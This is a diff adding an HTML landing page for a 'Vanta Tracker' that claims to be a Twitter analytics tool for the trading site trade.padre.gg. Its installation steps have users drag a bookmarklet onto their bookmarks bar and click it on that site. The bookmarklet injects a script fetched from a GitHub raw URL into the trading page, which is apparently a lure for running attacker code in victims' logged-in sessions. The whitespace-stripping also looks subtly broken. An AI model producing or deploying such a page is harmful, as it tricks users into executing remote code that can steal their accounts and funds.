@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #00ff88; --bg-dark: #0a0a0a; --border: rgba(0, 255, 136, 0.2); }
+        body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); color: #e0e0e0; margin: 0; overflow-x: hidden; }
+        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.3; }
+        header { text-align: center; padding: 100px 20px; border-bottom: 2px solid var(--primary); background: linear-gradient(180deg, #000, #001a0d); }
+        h1 { font-size: 3.5em; color: var(--primary); text-shadow: 0 0 10px rgba(0,255,136,0.4); margin: 0; }
+        .setup-section { padding: 80px 20px; max-width: 800px; margin: 0 auto; text-align: center; }
+        .cta-button { 
+            display: inline-block; background: linear-gradient(135deg, var(--primary), #00cc66); 
+            color: #000; padding: 20px 45px; text-decoration: none; border-radius: 8px; 
+            font-weight: 800; font-size: 1.5em; cursor: move; box-shadow: 0 6px 25px rgba(0,255,136,0.4); 
+            transition: 0.3s; border: 1px solid var(--primary);
+        }
+        .cta-button:hover { transform: scale(1.05); box-shadow: 0 10px 35px rgba(0,255,136,0.6); }
+        ol { text-align: left; margin: 40px 0; line-height: 2; font-size: 1.2em; color: #aaa; }
+        li b { color: var(--primary); }
+    </style>
+</head>
+<body>
+    <canvas id="filamentCanvas"></canvas>
+    
+    <header>
+        <h1>Vanta Tracker</h1>
+        <p>Advanced Twitter API Polling for Padre Analytics</p>
+    </header>
+
+    <section class="setup-section">
+        <h2>Installation</h2>
+        <ol>
+            <li>Ensure your <b>Bookmarks Bar</b> is visible (Ctrl+Shift+B).</li>
+            <li><b>Drag and Drop</b> the button below onto your bar.</li>
+            <li>Navigate to <b>trade.padre.gg</b>.</li>
+            <li>Click the bookmark to initialize the <b>Vanta Auditor</b>.</li>
+        </ol>
+
+        <a href="#" class="cta-button" id="vanta-tool">VANTA TRACKER</a>
+    </section>
+
+    <script>
+        /* --- 1. WebGL BACKGROUND ANIMATION --- */
+        const canvas = document.getElementById('filamentCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        let filaments = [];
+        for(let i=0; i<25; i++) filaments.push({
+            x: Math.random()*canvas.width, y: Math.random()*canvas.height,
+            len: 100+Math.random()*150, angle: Math.random()*Math.PI*2,
+            spd: 0.5+Math.random()
+        });
+        function animate() {
+            ctx.fillStyle = 'rgba(10, 10, 10, 0.1)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            filaments.forEach(f => {
+                f.x += Math.cos(f.angle)*f.spd; f.y += Math.sin(f.angle)*f.spd;
+                if(f.x<0||f.x>canvas.width||f.y<0||f.y>canvas.height) { f.x=Math.random()*canvas.width; f.y=Math.random()*canvas.height; }
+                ctx.strokeStyle = '#00ff88'; ctx.beginPath(); ctx.moveTo(f.x,f.y);
+                ctx.lineTo(f.x+Math.cos(f.angle)*f.len, f.y+Math.sin(f.angle)*f.len); ctx.stroke();
+            });
+            requestAnimationFrame(animate);
+        }
+        animate();
+
+        /* --- 2. BOOKMARKLET GENERATOR --- */
+        // Note: We use your GitHub raw link to fetch the tracker logic.
+        const githubRawUrl = "https://raw.githubusercontent.com/Jinxthesimp/Dropshipper/main/tracker.js";
+        
+        const payload = `javascript:(function(){
+            const s = document.createElement('script');
+            s.src = '${githubRawUrl}?t=' + Date.now();
+            document.body.appendChild(s);
+        })();`.replace(/\s+/g, ''); // Remove spaces for URL safety
+
+        document.getElementById('vanta-tool').href = payload;
+    </script>
+</body>
+</html>
